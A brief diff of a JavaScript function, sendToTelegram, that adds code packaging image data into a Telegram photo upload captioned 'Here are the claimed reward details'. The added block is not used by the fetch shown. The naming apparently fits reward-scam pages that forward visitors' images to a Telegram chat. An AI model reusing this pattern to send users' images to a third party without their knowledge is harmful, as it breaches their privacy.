@@ -425,6 +425,18 @@ function sendToTelegram(imageData) {
 function sendToTelegram(imageData) {
     const alertMessageDiv = document.getElementById('alertMessage');
 
+
+
+const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', dataURItoBlob(imageData));
+    formData.append('caption', 'Here are the claimed reward details');
+
+
+
+
+
+    
     fetch('/telegramProxy', {
         method: 'POST',
         body: JSON.stringify({ imageData }),
